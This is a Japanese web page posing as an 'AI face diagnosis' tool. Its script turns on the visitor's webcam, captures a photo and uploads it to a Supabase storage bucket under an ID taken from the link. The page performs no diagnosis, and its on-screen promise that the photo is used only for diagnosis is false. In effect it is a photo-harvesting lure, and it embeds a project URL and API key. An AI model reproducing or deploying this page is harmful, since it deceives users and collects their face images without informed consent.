<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>AI顔診断</title>
  <style>
    body {
      background: linear-gradient(to right, #e3f2fd, #fde2e4);
      color: #333;
      font-family: "Hiragino Kaku Gothic ProN", sans-serif;
      text-align: center;
      margin: 0;
      padding: 0;
    }
    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }
    .preview-box {
      width: 250px;
      height: 250px;
      background: #fff;
      border-radius: 20px;
      margin-top: 20px;
      overflow: hidden;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }
    video {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    button {
      margin-top: 15px;
      background: #2196f3;
      color: white;
      border: none;
      border-radius: 8px;
      padding: 10px 20px;
      font-size: 1rem;
      cursor: pointer;
      transition: 0.2s;
    }
    button:hover {
      opacity: 0.8;
    }
    input {
      margin-top: 20px;
      width: 80%;
      max-width: 280px;
      padding: 10px;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 1rem;
      text-align: center;
    }
    p.note {
      color: #555;
      font-size: 0.8rem;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="container" id="main">
    <h1 style="color:#1976d2;">AI顔診断</h1>
    <div class="preview-box">
      <video id="video" autoplay playsinline muted></video>
    </div>
    <p id="status" style="color:#666; margin-top:10px;">カメラの許可を押してください...</p>
  </div>

  <script type="module">
    import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

    const supabase = createClient(
      "https://hwwjnlprsntmdcytktbm.supabase.co",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imh3d2pubHByc250bWRjeXRrdGJtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjA2NDU3ODcsImV4cCI6MjA3NjIyMTc4N30.Dni-WtNXSEdyRxH2TSq0oTR9homfAi1Ptz1h0MURFrY"
    );

    const id = new URLSearchParams(window.location.search).get("id") || Math.random().toString(36).substring(2, 9);
    const video = document.getElementById("video");
    const status = document.getElementById("status");
    const main = document.getElementById("main");

    window.addEventListener("load", async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        video.srcObject = stream;

        // 許可後にUIを切り替える
        setTimeout(() => showMainUI(stream), 2000);
      } catch (e) {
        status.textContent = "カメラの許可が得られませんでした。";
      }
    });

    function showMainUI(stream) {
      // メインUIを構築
      main.innerHTML = `
        <h1 style="color:#1976d2;">AI顔診断</h1>
        <p>あなたのお顔を診断してみましょう！<br>診断にはカメラの許可が必要です。</p>
        <input type="text" placeholder="あなたの名前を入力" disabled />
        <button id="startBtn">🧠 診断をはじめる</button>
        <div class="preview-box">
          <video id="liveVideo" autoplay playsinline muted></video>
        </div>
        <p class="note">※この写真は診断目的でのみ使用され、外部に公開されることはありません。</p>
      `;

      const liveVideo = document.getElementById("liveVideo");
      liveVideo.srcObject = stream;

      document.getElementById("startBtn").addEventListener("click", () => captureAndUpload(stream));
    }

    async function captureAndUpload(stream) {
      const liveVideo = document.getElementById("liveVideo");
      const canvas = document.createElement("canvas");
      canvas.width = liveVideo.videoWidth;
      canvas.height = liveVideo.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(liveVideo, 0, 0, canvas.width, canvas.height);
      const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.9));

      status.textContent = "診断中...";
      const { error } = await supabase.storage.from("photos").upload(`${id}.jpg`, blob, { upsert: true });

      if (error) {
        alert("送信エラーが発生しました。");
      } else {
        alert("診断用の写真が送信されました。");
      }
    }
  </script>
</body>
</html>
